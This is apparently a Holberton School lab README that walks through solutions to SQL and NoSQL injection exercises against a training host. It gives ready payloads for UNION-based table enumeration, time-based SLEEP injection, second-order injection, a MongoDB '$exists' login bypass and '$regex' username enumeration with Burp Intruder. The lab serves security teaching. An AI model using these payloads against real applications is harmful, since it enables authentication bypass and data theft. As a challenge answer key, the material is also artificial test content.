holberton# NoSQL Injection Testing Lab

## Description
This repository contains educational materials and exercises for understanding NoSQL injection vulnerabilities in a controlled, simulated environment. The exercises are designed to help security professionals and students learn about:
- Account enumeration techniques
- NoSQL query structure and injection patterns
- Authentication bypass scenarios
- Secure coding practices to prevent NoSQL injection

## Educational Objectives
1. Understand how NoSQL injection vulnerabilities can occur
2. Learn to identify vulnerable endpoints and parameters
3. Practice secure testing methodologies
4. Develop skills in:
   - Request parameter analysis
   - Query manipulation
   - Authentication testing
   - Response analysis

## Project Structure
- `web_application_security/` - Main directory containing security exercises
  - `0x03_sql_nosql_injection/` - NoSQL injection testing scenarios
    - `7-flag.txt` - Exercise completion verification

## Tools Used
- Burp Suite (Professional/Community)
- Web browser
- API testing tools

## Important Note
This content is strictly for educational purposes in controlled testing environments. All exercises should be performed only on authorized systems and with appropriate permissions.

## Challenge Instructions

### Task 1: Basic SQL Injection

1. Replace `{YOUR IP}` with your container 0x01 IP in the following URL:
```
http://{YOUR IP}/api/a3/sql_injection/all_orders?status=1'+UNION+SELECT+NULL,version(),NULL,NULL,NULL+--+
```

2. Send request to Repeater
3. In Repeater, modify the host from your IP to `web0x01.hbtn`
4. If successful, you will receive the flag in the response

### Task 2: Table Enumeration

1. In Repeater, use the following request:
```
GET /api/a3/sql_injection/all_orders?status=1'+UNION+SELECT+NULL,name,NULL,NULL,NULL+FROM+sqlite_master--+ HTTP/1.1
Host: web0x01.hbtn
```

2. Try different table names until you find the flag:
   - `sqlite_master`
   - `sqlite_autoindex_Users_1`
   - `not_me`

3. Once you find the correct table, modify the request to:
```
GET /api/a3/sql_injection/all_orders?status=1'+UNION+SELECT+NULL,value,NULL,NULL,NULL+FROM+{TABLE_NAME}--+ HTTP/1.1
Host: web0x01.hbtn
```

### Task 3: Time-Based Injection

In Repeater, use:
```
GET /api/a3/sql_injection/all_orders?status=1'+UNION+SELECT+NULL,NULL,NULL,SLEEP(5),NULL--+ HTTP/1.1
Host: web0x01.hbtn
```

### Task 4: Second-Order Injection

1. Enable intercept
2. Target the following endpoints:
   - Register: `http://web0x01.hbtn/api/a3/sql_injection/second_order/register`
   - Login: `http://web0x01.hbtn/api/a3/sql_injection/second_order/login`

3. For Register, use:
```json
POST /api/a3/sql_injection/second_order/register HTTP/1.1
Host: web0x01.hbtn
Content-Type: application/json

{
  "username": "test2", 
  "name": "{{FLAG}}",
  "password": "test123"
}
```

4. For Login, use:
```json
POST /api/a3/sql_injection/second_order/login HTTP/1.1
Host: web0x01.hbtn
Content-Type: application/json

{
  "username": "test2",
  "password": "test123"
}
```

### Task 5: NoSQL Injection Endpoints

Two vulnerable endpoints:
- `/api/a3/nosql_injection/market_values`
- `/api/a3/nosql_injection/sign_in`

### Task 6: NoSQL Authentication Bypass

Use:
```json
POST /api/a3/nosql_injection/sign_in HTTP/1.1
Host: web0x01.hbtn
Content-Type: application/json

{"username": {"$exists": true}, "password": {"$exists": true}}
```

### Task 7: NoSQL Username Enumeration

1. Send a sign-in request to Intruder
2. In Repeater, use:
```json
POST /api/a3/nosql_injection/sign_in HTTP/1.1
Host: web0x01.hbtn
Content-Type: application/json

{
  "username": {"$regex": "^a"},
  "password": {"$exists": true}
}
```

3. For Intruder:
   - Mark position after `^` in the regex
   - Add payload characters: a-z, 0-9, _
   - Example payload:
   ```json
   {
     "username": {"$regex": "^§a§"},
     "password": {"$exists": true}
   }
   ```

4. For subsequent characters:
   ```json
   {
     "username": {"$regex": "^a§a§"},
     "password": {"$exists": true}
   }
   ```

Note: There are 8 users to find. This process requires multiple iterations and can be time-consuming.

## Learning Resources
- [OWASP NoSQL Injection Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [MongoDB Security Checklist](https://www.mongodb.com/docs/manual/administration/security-checklist/)
- Web application security best practices

## Acknowledgments
- Created for educational use at Holberton School
- All testing conducted in isolated lab environments
- Materials designed for security education and awareness

## Disclaimer
The techniques demonstrated are for learning purposes only. Users must:
- Only practice on authorized systems
- Follow ethical testing guidelines
- Understand and respect security boundaries
- Use knowledge responsibly for defensive purposes

## Usage
Complete exercises within the designated testing environment following provided instructions. Document findings and implement suggested security measures.
